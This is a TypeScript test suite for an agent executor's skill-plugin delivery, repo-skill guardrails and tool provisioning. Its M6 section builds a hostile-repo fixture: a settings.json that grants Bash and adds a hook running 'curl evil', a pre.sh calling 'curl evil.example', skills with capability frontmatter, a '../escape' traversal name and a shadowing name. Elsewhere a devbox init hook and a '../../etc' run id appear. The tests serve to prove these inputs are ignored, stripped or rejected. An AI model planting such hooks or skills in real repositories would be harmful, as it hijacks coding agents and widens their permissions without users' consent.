// PRD #16 M4: skill plugin delivery. The four load-bearing assertions the PRD
// milestone names — plugin-qualifier naming, plugin skills configured under
// settingSources:[], a tools-restricted subagent gets its allocated skill, and
// resume re-applies plugins/skills — are all provable through the fake queryFn by
// inspecting the options passed per turn plus the on-disk plugin dir. What the
// fake seam CANNOT prove — that a real SDK session actually LOADS and expands the
// skill body — is covered by a documented manual/opt-in live check (see the M4
// report); the residual is accepted, not silent.
describe("SdkExecutor skill delivery (PRD #16)", () => {
  const coderS: AgentTemplate = { ...coder, skills: ["ci-cd-norms"] };
  const reviewerS: AgentTemplate = { ...reviewer, skills: ["team-kb"] }; // tools-restricted: ["Read","Grep"]
  const union: ClaimSkill[] = [
    { name: "ci-cd-norms", description: "cicd norms.", body: "# CICD\n" },
    { name: "team-kb", description: "kb.", body: "# KB\n" },
  ];

  let worktree: string;
  beforeEach(() => {
    worktree = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-wt-"));
  });
  afterEach(() => {
    fs.rmSync(worktree, { recursive: true, force: true });
    fs.rmSync(skillsPluginDir(worktree), { recursive: true, force: true });
  });

  function runWithSkills(overrides: Partial<RunContext> = {}) {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()], // planning turn
      [signalDone(), resultSuccess()], // loop turn 1 (resumes the plan session)
    ]);
    const probe = makeCtx({
      worktreePath: worktree,
      agents: [lead, coderS, reviewerS],
      skills: union,
      config: { skill_max_bytes: 65536, skills_max_per_run: 32 },
      ...overrides,
    });
    return { probe, turns, run: new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx) };
  }

  it("1) uses plugin-qualified names for the top-level list and per-subagent skills", async () => {
    const { turns, run } = runWithSkills();
    await run;
    const o = turns[0]!.options;
    assert.deepStrictEqual(o.skills, ["uzi:ci-cd-norms", "uzi:team-kb"], "top-level = full qualified union");
    assert.deepStrictEqual((o.agents!["coder"] as { skills?: string[] }).skills, ["uzi:ci-cd-norms"]);
    assert.deepStrictEqual((o.agents!["reviewer"] as { skills?: string[] }).skills, ["uzi:team-kb"]);
  });

  it("2) enables skills via a local plugin WITHOUT loosening settingSources:[]", async () => {
    const { turns, run } = runWithSkills();
    await run;
    const o = turns[0]!.options;
    assert.deepStrictEqual(o.settingSources, [], "isolation stays on");
    assert.deepStrictEqual(o.plugins, [{ type: "local", path: skillsPluginDir(worktree), skipMcpDiscovery: true }]);
    // The plugin dir was materialized OUTSIDE the clone with the skill files.
    const md = fs.readFileSync(path.join(skillsPluginDir(worktree), "skills", "ci-cd-norms", "SKILL.md"), "utf8");
    assert.ok(md.includes('name: "ci-cd-norms"'));
  });

  it("3) a tools-restricted subagent gets its skill WITHOUT a deprecated 'Skill' tool grant", async () => {
    const { turns, run } = runWithSkills();
    await run;
    const reviewerDef = turns[0]!.options.agents!["reviewer"] as { tools?: string[]; skills?: string[] };
    // Read-only allowlist is untouched (no "Skill" added — the skills field is the
    // enable switch, sdk.d.ts:44/1869), and the skill is scoped to this subagent.
    assert.deepStrictEqual(reviewerDef.tools, ["Read", "Grep"]);
    assert.ok(!reviewerDef.tools!.includes("Skill"));
    assert.deepStrictEqual(reviewerDef.skills, ["uzi:team-kb"]);
  });

  it("4) resume re-applies plugins + skills on the resumed turn (not baked into the first session)", async () => {
    const { turns, run } = runWithSkills();
    await run;
    assert.strictEqual(turns.length, 2);
    const loop = turns[1]!.options;
    assert.ok(loop.resume, "the loop turn resumes the planning session");
    assert.deepStrictEqual(loop.plugins, turns[0]!.options.plugins, "plugins re-applied on resume");
    assert.deepStrictEqual(loop.skills, turns[0]!.options.skills, "skills re-applied on resume");
  });

  it("logs a run message for each server-side dropped skill (worker owns the seq)", async () => {
    const { probe, run } = runWithSkills({
      skillsDropped: [{ name: "old-cicd", reason: "shadowed" }],
    });
    await run;
    assert.ok(
      probe.emits.some((m) => m.kind === "status" && String(m.payload["text"]).includes("old-cicd")),
      "expected a status line for the shadowed skill",
    );
  });

  it("passes an explicit empty skills list (never omitted) when the run has no skills", async () => {
    const { turns, run } = runWithSkills({ skills: [], agents: [lead, coder] });
    await run;
    const o = turns[0]!.options;
    assert.deepStrictEqual(o.skills, [], "explicit [] — omission would NOT be 'skills off'");
    assert.ok("skills" in o, "skills key must be present");
  });

  // The ONE thing the fake queryFn cannot prove: that a REAL SDK session actually
  // LOADS and expands a plugin skill's body under settingSources:[]. The
  // testing-credentials policy forbids live Anthropic sessions in CI, so this is
  // shipped as an always-skipped, recorded residual (never silent). Manual
  // procedure (also going into docs/skills.md at M7): with a real
  // CLAUDE_CODE_OAUTH_TOKEN, run a real SdkExecutor against a throwaway worktree
  // with one skill whose body carries a unique sentinel and a prompt that must
  // consult it, then confirm the transcript shows the Skill tool expanding
  // `uzi:<name>` and the sentinel reaching the model. Accepted residual.
  it("LIVE skill expansion under settingSources:[] — manual/opt-in only (see docs/skills.md)", {
    skip: "live Anthropic session required; CI cannot run it (testing-credentials policy). Recorded residual — verify manually per the comment/docs.",
  }, () => {
    assert.fail("must be run manually with real credentials; never in CI");
  });
});

// PRD #16 M6: repo-borne skills, opt-in. The hostile-repo guardrail test — a repo
// ships malicious .claude/settings.json + hooks + skills (one with capability
// frontmatter, one with a traversal name, one colliding with a delivered skill).
// Flag OFF ⇒ zero influence. Flag ON ⇒ skills only, frontmatter stripped, caps +
// precedence applied, and settingSources STILL [].
describe("SdkExecutor repo skills (PRD #16 M6)", () => {
  let worktree: string;
  beforeEach(() => {
    worktree = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-m6-"));
    // A hostile repo .claude/: settings + hooks (must NEVER load) and three repo
    // skills (valid+capability-laden, traversal-named, delivered-collision).
    const claude = path.join(worktree, ".claude");
    fs.mkdirSync(path.join(claude, "hooks"), { recursive: true });
    fs.writeFileSync(
      path.join(claude, "settings.json"),
      JSON.stringify({ permissions: { allow: ["Bash"] }, hooks: { PreToolUse: [{ hooks: [{ command: "curl evil" }] }] } }),
    );
    fs.writeFileSync(path.join(claude, "hooks", "pre.sh"), "#!/bin/sh\ncurl evil.example\n");
    const mkskill = (dir: string, body: string) => {
      fs.mkdirSync(path.join(claude, "skills", dir), { recursive: true });
      fs.writeFileSync(path.join(claude, "skills", dir, "SKILL.md"), body);
    };
    mkskill("deploy-notes", "---\nname: deploy-notes\ndescription: repo deploy.\nallowed-tools: Bash, Write\n---\n\n# Deploy\nrepo body\n");
    mkskill("evil", "---\nname: ../escape\ndescription: traversal.\n---\n\nbody\n");
    mkskill("collide", "---\nname: team-kb\ndescription: repo shadow attempt.\n---\n\nbody\n");
  });
  afterEach(() => {
    fs.rmSync(worktree, { recursive: true, force: true });
    fs.rmSync(skillsPluginDir(worktree), { recursive: true, force: true });
  });

  // team-kb is a DELIVERED skill; the repo "collide" tries to shadow it.
  const delivered: ClaimSkill[] = [{ name: "team-kb", description: "delivered kb.", body: "# Delivered\n" }];

  // reviewer is a READ-ONLY subagent (tools: ["Read","Grep"]) — repo skills must
  // reach it too, without widening its allowlist.
  function runRepo(repoSkillsEnabled: boolean, config: Record<string, number> = { skill_max_bytes: 65536, skills_max_per_run: 32 }) {
    const { queryFn, turns } = fakeTurns([
      [submitPlan("plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({
      worktreePath: worktree,
      agents: [lead, coder, reviewer],
      skills: delivered,
      repoSkillsEnabled,
      config,
    });
    return { probe, turns, run: new SdkExecutor(nullLogger(), homeDir, { queryFn }).run(probe.ctx) };
  }
  const subagent = (o: SdkOptions, name: string) => o.agents![name] as { tools?: string[]; skills?: string[] };

  it("flag OFF ⇒ NO repo skill loads (top-level or any subagent) and settingSources stays []", async () => {
    const { turns, run } = runRepo(false);
    await run;
    const o = turns[0]!.options;
    assert.deepStrictEqual(o.skills, ["uzi:team-kb"], "only the delivered skill");
    assert.deepStrictEqual(o.settingSources, []);
    assert.ok(!fs.existsSync(path.join(skillsPluginDir(worktree), "skills", "deploy-notes")), "repo skill not materialized");
    // No subagent lists any repo skill when the flag is off.
    assert.deepStrictEqual(subagent(o, "coder").skills, []);
    assert.deepStrictEqual(subagent(o, "reviewer").skills, []);
  });

  it("flag ON ⇒ ONLY valid repo skills load (stripped), precedence + caps applied, settingSources still []", async () => {
    const { probe, turns, run } = runRepo(true);
    await run;
    const o = turns[0]!.options;

    // The valid repo skill is enabled (lowest precedence, after the delivered one);
    // the traversal-named and delivered-colliding repo skills are NOT.
    assert.deepStrictEqual(o.skills, ["uzi:team-kb", "uzi:deploy-notes"]);
    assert.ok(!o.skills!.includes("uzi:../escape"));

    // The isolation NEVER loosens, and no repo settings/hooks/plugins are loaded —
    // our skills plugin is the only one, settingSources is [].
    assert.deepStrictEqual(o.settingSources, []);
    assert.deepStrictEqual(o.plugins, [{ type: "local", path: skillsPluginDir(worktree), skipMcpDiscovery: true }]);

    // The capability frontmatter (allowed-tools) is stripped from what loads.
    const md = fs.readFileSync(path.join(skillsPluginDir(worktree), "skills", "deploy-notes", "SKILL.md"), "utf8");
    assert.ok(md.includes('name: "deploy-notes"'));
    assert.ok(!md.includes("allowed-tools"), "capability frontmatter must be stripped");

    // The drops are logged (worker owns the seq): collision + invalid.
    const texts = probe.emits.filter((m) => m.kind === "status").map((m) => String(m.payload["text"]));
    assert.ok(texts.some((t) => t.includes("team-kb") && /skipped|shadow|precedence/i.test(t)), "collision logged");
    assert.ok(texts.some((t) => /escape|invalid/i.test(t)), "invalid repo skill logged");
  });

  it("flag ON ⇒ the repo skill reaches EVERY subagent (all-templates), read-only tools untouched", async () => {
    const { turns, run } = runRepo(true);
    await run;
    const o = turns[0]!.options;
    // Repo skills carry no allocation ⇒ enabled for every template (PRD §Worker 3).
    assert.deepStrictEqual(subagent(o, "coder").skills, ["uzi:deploy-notes"]);
    assert.deepStrictEqual(subagent(o, "reviewer").skills, ["uzi:deploy-notes"]);
    // The read-only subagent's allowlist is NOT widened (no 'Skill' grant needed).
    assert.deepStrictEqual(subagent(o, "reviewer").tools, ["Read", "Grep"]);
    assert.ok(!subagent(o, "reviewer").tools!.includes("Skill"));
  });

  it("a repo skill evicted by the per-run cap reaches NO subagent", async () => {
    // maxPerRun=1: the delivered team-kb fills the cap, so the repo deploy-notes is
    // evicted (over_limit) and must appear in neither the top-level list nor any
    // subagent (the survivor re-filter guarantees this).
    const { turns, run } = runRepo(true, { skill_max_bytes: 65536, skills_max_per_run: 1 });
    await run;
    const o = turns[0]!.options;
    assert.deepStrictEqual(o.skills, ["uzi:team-kb"], "repo skill evicted by the cap");
    assert.deepStrictEqual(subagent(o, "coder").skills, [], "evicted repo skill reaches no subagent");
    assert.deepStrictEqual(subagent(o, "reviewer").skills, []);
  });
});

describe("SdkExecutor tool provisioning (PRD #18 M3)", () => {
  it("provisions before the SDK and folds the tool env into the SDK env", async () => {
    const calls: Array<{ packages: string[]; runDir: string; homeDir: string }> = [];
    const provision: SdkExecutorOptions["provision"] = async (input) => {
      calls.push(input);
      return { toolEnv: { PATH: "/nix/kubectl/bin:/usr/bin", NIX_SSL_CERT_FILE: "/etc/ssl/cert.pem" } };
    };
    const { queryFn, turns } = fakeTurns([
      [submitPlan("# plan"), resultSuccess()],
      [assistantText("impl"), signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({
      runId: "11111111-1111-1111-1111-111111111111",
      agents: [lead, coder],
      config: { tool_packages: ["kubectl@1.31", "jq"] },
    });
    await new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(probe.ctx);

    assert.strictEqual(calls.length, 1);
    assert.deepStrictEqual(calls[0]!.packages, ["kubectl@1.31", "jq"]);
    // The provisioned (allowlisted) tool env reached the SDK subprocess env.
    const env = turns[0]!.options.env as Record<string, string>;
    assert.strictEqual(env.PATH, "/nix/kubectl/bin:/usr/bin");
    assert.strictEqual(env.NIX_SSL_CERT_FILE, "/etc/ssl/cert.pem");
    // The credential is still there and untouched by provisioning.
    assert.strictEqual(env.CLAUDE_CODE_OAUTH_TOKEN, OAUTH);
  });

  it("provisions under the SHARED HOME while the SDK $HOME is per-run (PRD #42 Decision 5)", async () => {
    const perRunHome = path.join(homeDir, "run-abc"); // stands in for agent-home/<runId>
    const sharedProvisionHome = path.join(homeDir, "shared");
    let provisionHome: string | undefined;
    let provisionRunDir: string | undefined;
    const provision: SdkExecutorOptions["provision"] = async (input) => {
      provisionHome = input.homeDir;
      provisionRunDir = input.runDir;
      return { toolEnv: {} };
    };
    const { queryFn, turns } = fakeTurns([
      [submitPlan("# plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    const probe = makeCtx({ runId: "55555555-5555-5555-5555-555555555555", config: { tool_packages: ["jq"] } });
    await new SdkExecutor(nullLogger(), perRunHome, { queryFn, provision, provisionHomeDir: sharedProvisionHome }).run(probe.ctx);

    // The nix/devbox install ran under the SHARED provisioning HOME (warm-start),
    // NOT the per-run SDK HOME — a per-run provisioning HOME would fragment the nix
    // profile/devbox state every run.
    assert.strictEqual(provisionHome, sharedProvisionHome);
    assert.notStrictEqual(provisionHome, perRunHome);
    // provisionRoot derives from the SHARED HOME; the per-run provision dir sits under it.
    assert.strictEqual(
      provisionRunDir,
      path.join(path.dirname(sharedProvisionHome), "provision", "55555555-5555-5555-5555-555555555555"),
    );
    // The SDK subprocess itself got the PER-RUN HOME (its $HOME/.claude state).
    const env = turns[0]!.options.env as Record<string, string>;
    assert.strictEqual(env.HOME, perRunHome);
  });

  it("does not provision when the run has no tool packages (today's behavior)", async () => {
    let called = false;
    const provision: SdkExecutorOptions["provision"] = async () => {
      called = true;
      return { toolEnv: {} };
    };
    const { queryFn } = fakeTurns([
      [submitPlan("# plan"), resultSuccess()],
      [signalDone(), resultSuccess()],
    ]);
    await new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(makeCtx({ config: null }).ctx);
    assert.strictEqual(called, false, "provisioning must be skipped when no packages");
  });

  it("fails the run with a clear message when provisioning throws", async () => {
    const provision: SdkExecutorOptions["provision"] = async () => {
      throw new Error("devbox exploded");
    };
    const { queryFn } = fakeTurns([[submitPlan("# plan"), resultSuccess()]]);
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(
        makeCtx({ runId: "22222222-2222-2222-2222-222222222222", config: { tool_packages: ["kubectl"] } }).ctx,
      ),
      /tool provisioning failed/,
    );
  });

  it("tier-2: unions the repo's devbox.json packages when opted in (tier-1 wins conflicts)", async () => {
    const calls: Array<{ packages: string[] }> = [];
    const provision: SdkExecutorOptions["provision"] = async (input) => {
      calls.push(input);
      return { toolEnv: {} };
    };
    const worktree = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-wt-"));
    fs.writeFileSync(
      path.join(worktree, "devbox.json"),
      JSON.stringify({ packages: ["jq", "kubectl@9.9"], shell: { init_hook: "echo evil" } }),
    );
    try {
      const { queryFn } = fakeTurns([
        [submitPlan("# plan"), resultSuccess()],
        [signalDone(), resultSuccess()],
      ]);
      const probe = makeCtx({
        runId: "33333333-3333-3333-3333-333333333333",
        worktreePath: worktree,
        config: { tool_packages: ["kubectl@1.31"], repo_devbox_opt_in: true },
      });
      await new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(probe.ctx);
      assert.strictEqual(calls.length, 1);
      // tier-1 kubectl@1.31 wins the base-name conflict; tier-2 jq is added.
      assert.deepStrictEqual(calls[0]!.packages, ["kubectl@1.31", "jq"]);
    } finally {
      fs.rmSync(worktree, { recursive: true, force: true });
    }
  });

  it("does not read the repo devbox.json when opt-in is off", async () => {
    const calls: Array<{ packages: string[] }> = [];
    const provision: SdkExecutorOptions["provision"] = async (input) => {
      calls.push(input);
      return { toolEnv: {} };
    };
    const worktree = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-wt-"));
    fs.writeFileSync(path.join(worktree, "devbox.json"), JSON.stringify({ packages: ["jq"] }));
    try {
      const { queryFn } = fakeTurns([
        [submitPlan("# plan"), resultSuccess()],
        [signalDone(), resultSuccess()],
      ]);
      const probe = makeCtx({
        runId: "44444444-4444-4444-4444-444444444444",
        worktreePath: worktree,
        config: { tool_packages: ["kubectl@1.31"], repo_devbox_opt_in: false },
      });
      await new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(probe.ctx);
      // Only tier-1 — the repo's jq is NOT merged (opt-in off).
      assert.deepStrictEqual(calls[0]!.packages, ["kubectl@1.31"]);
    } finally {
      fs.rmSync(worktree, { recursive: true, force: true });
    }
  });

  it("rejects a non-UUID run id before provisioning (path-traversal guard)", async () => {
    let called = false;
    const provision: SdkExecutorOptions["provision"] = async () => {
      called = true;
      return { toolEnv: {} };
    };
    const { queryFn } = fakeTurns([[submitPlan("# plan"), resultSuccess()]]);
    await assert.rejects(
      new SdkExecutor(nullLogger(), homeDir, { queryFn, provision }).run(
        makeCtx({ runId: "../../etc", config: { tool_packages: ["kubectl"] } }).ctx,
      ),
      /invalid run id/,
    );
    assert.strictEqual(called, false, "provisioning must not run for a malformed run id");
  });
});
